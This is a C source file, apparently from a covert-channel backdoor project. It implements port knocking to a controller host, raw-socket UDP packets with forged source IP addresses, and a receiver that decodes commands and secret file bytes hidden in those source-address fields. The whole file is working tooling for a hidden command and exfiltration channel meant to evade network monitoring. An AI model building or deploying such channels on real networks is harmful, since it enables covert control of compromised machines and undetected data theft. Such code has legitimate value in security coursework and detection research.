#include "network.h"

#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/socket.h>
#include <unistd.h>


#define KNOCKS 3
#define COVERT_CHAN 8505
#define KNOCK2 1999
#define KNOCK3 1201

#define PKT_MAX_LEN 4096
#define IP_VERSION 4
#define IP_IHL 5             // 5 * 32-bit words = 20 bytes
#define IP_FRAG_OFF 0
#define IP_HDR_TOS 0
#define IP_HDR_TTL 64

#define MIN_SEND_PKT_WAIT 250
#define USEC_TO_SEC 1000000

int setup_covert_fd(void) {
    const int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (fd == -1) {
        fprintf(stderr, "covert socket() failed\n");
        return -1;
    }

    const int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "setsockopt(IPPROTO_IP, IP_HDRINCL) failed\n");
        return -1;
    }

    return fd;
}

int perform_knock(const struct Context *ctx) {
    const int KNOCK_PORTS[KNOCKS] = {COVERT_CHAN, KNOCK2, KNOCK3};
    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    if (inet_pton(AF_INET, ctx->runner_ip, &dest.sin_addr) != 1) {
        perror("inet_pton");
        return -1;
    }

    for (int i = 0; i < KNOCKS; i++) {
        const int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd == -1) {
            perror("socket");
            return -1;
        }

        dest.sin_port = htons(KNOCK_PORTS[i]);

        if (connect(fd, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("connect");
            close(fd);
            return -1;
        }

        close(fd);

        sleep(1);
    }

    return 0;
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;

    for (; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short) (~sum);
}

void print_packet_info(const uint8_t *packet) {
    const struct iphdr *ip = (struct iphdr *)packet;
    const struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));

    char src_ip[INET_ADDRSTRLEN];
    char dst_ip[INET_ADDRSTRLEN];

    inet_ntop(AF_INET, &ip->saddr, src_ip, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &ip->daddr, dst_ip, INET_ADDRSTRLEN);

    const uint16_t ip_len = ntohs(ip->tot_len);
    const uint16_t udp_len = ntohs(udp->len);
    const uint16_t payload_len = udp_len - sizeof(struct udphdr);

    printf("-----------------------Packet Info-----------------------\n");

    printf("IP Header:\n");
    printf("  Version        : %u\n", ip->version);
    printf("  Header Length  : %u bytes\n", ip->ihl * 4);
    printf("  TOS            : %u\n", ip->tos);
    printf("  Total Length   : %u\n", ip_len);
    printf("  ID             : %u\n", ntohs(ip->id));
    printf("  TTL            : %u\n", ip->ttl);
    printf("  Protocol       : %u\n", ip->protocol);
    printf("  Source IP      : %s\n", src_ip);
    printf("  Destination IP : %s\n", dst_ip);

    printf("\nUDP Header:\n");
    printf("  Source Port    : %u\n", ntohs(udp->source));
    printf("  Dest Port      : %u\n", ntohs(udp->dest));
    printf("  Length         : %u\n", udp_len);

    printf("\nPayload Length: %u\n", payload_len);
    printf("---------------------------------------------------------\n");
}

int send_packet(struct Context *ctx, const char *ip_src_addr) {
    uint8_t packet[PKT_MAX_LEN] = {0};

    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    uint8_t *payload = (uint8_t *) udp + sizeof (struct udphdr);
    const uint16_t payload_size = rand_payload(ctx, payload);
    const uint16_t pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;

    ip->ihl = IP_IHL;
    ip->version = IP_VERSION;
    ip->tos = IP_HDR_TOS;
    ip->tot_len = htons(pkt_len);
    ip->id = htons(rand_u16(ctx));
    ip->frag_off = IP_FRAG_OFF;
    ip->ttl = IP_HDR_TTL;
    ip->protocol = IPPROTO_UDP;
    ip->saddr = inet_addr(ip_src_addr);
    ip->daddr = inet_addr(ctx->runner_ip);
    checksum(ip, ip->ihl * 4);
    udp->source = htons(ctx->cmd_seq_num);
    udp->dest = htons(COVERT_CHAN);
    udp->len = htons(sizeof(struct udphdr) + payload_size);
    udp->check = 0;

    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(COVERT_CHAN);
    dest.sin_addr.s_addr = ip->daddr;

    const ssize_t ret = sendto(ctx->covert_fd, packet, pkt_len, 0, (struct sockaddr *)&dest, sizeof(dest));
    if (ret <= 0) {
        fprintf(stderr, "sento error\n");
    }
    print_packet_info(packet);

    if (ctx->cmd_seq_num == UINT16_MAX) {
        ctx->cmd_seq_num = 0;
    } else {
        (ctx->cmd_seq_num)++;
    }

    struct timespec sleep_time;
    sleep_time.tv_sec = 0;
    sleep_time.tv_nsec = (rand_u8(ctx) + MIN_SEND_PKT_WAIT) * USEC_TO_SEC;

    printf("Sleep time: %zu milliseconds\n", sleep_time.tv_nsec / 1000000);
    nanosleep(&sleep_time, NULL);

    return 0;
}

int recv_file_data(struct Context *ctx, struct List *list) {
    int is_term = 0;
    int is_first = 1;
    while (is_term == 0) {
        uint8_t buffer[PKT_MAX_LEN];

        ssize_t ret = recv(ctx->covert_fd, buffer, PKT_MAX_LEN, 0);
        if (ret < 0) {
            fprintf(stderr, "recv error\n");
            close(ctx->covert_fd);
            return -1;
        }

        const struct iphdr *ip = (struct iphdr *)buffer;
        if (ip->protocol != IPPROTO_UDP) {
            fprintf(stderr, "packet received is not UDP\n");
            return -1;
        }

        const struct udphdr *udp = (struct udphdr *)(buffer + ip->ihl*4);

        if (ntohs(udp->dest) == COVERT_CHAN) {
            struct Blob *blob = calloc(1, sizeof(struct Blob));
            if (is_first) {
                list->head = blob;
                list->tail = blob;
                is_first = 0;
            } else {
                blob->prev = list->tail;
                list->tail->next = blob;
                list->tail = blob;
            }

            // print_packet_info(buffer);
            char ip_buffer[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &ip->saddr, ip_buffer, sizeof(ip_buffer));

            uint8_t byte1 = 0;
            uint8_t byte2 = 0;
            uint8_t byte3 = 0;
            uint8_t byte4 = 0;

            decode_ip(ip_buffer, &byte1, &byte2, &byte3, &byte4);
            printf("------------------Packet num: %u------------------\n", ntohs(udp->source));
            printf("Full IP: %s\n", ip_buffer);
            printf("Type: ");
            if (byte2 == 0) {
                printf("Command\n");
                list->type = byte4;
            } else if (byte2 == 1) {
                printf("Term\n");
                is_term = 1;
            } else {
                printf("Data\n");
                printf("Packet secret data: %u %u\n", byte3, byte4);
                blob->data1 = byte3;
                blob->data2 = byte4;
            }

            blob->seq_num = ntohs(udp->source);
            blob->marked = 0;
            list->list_size++;
        }

    }

    return 0;
}

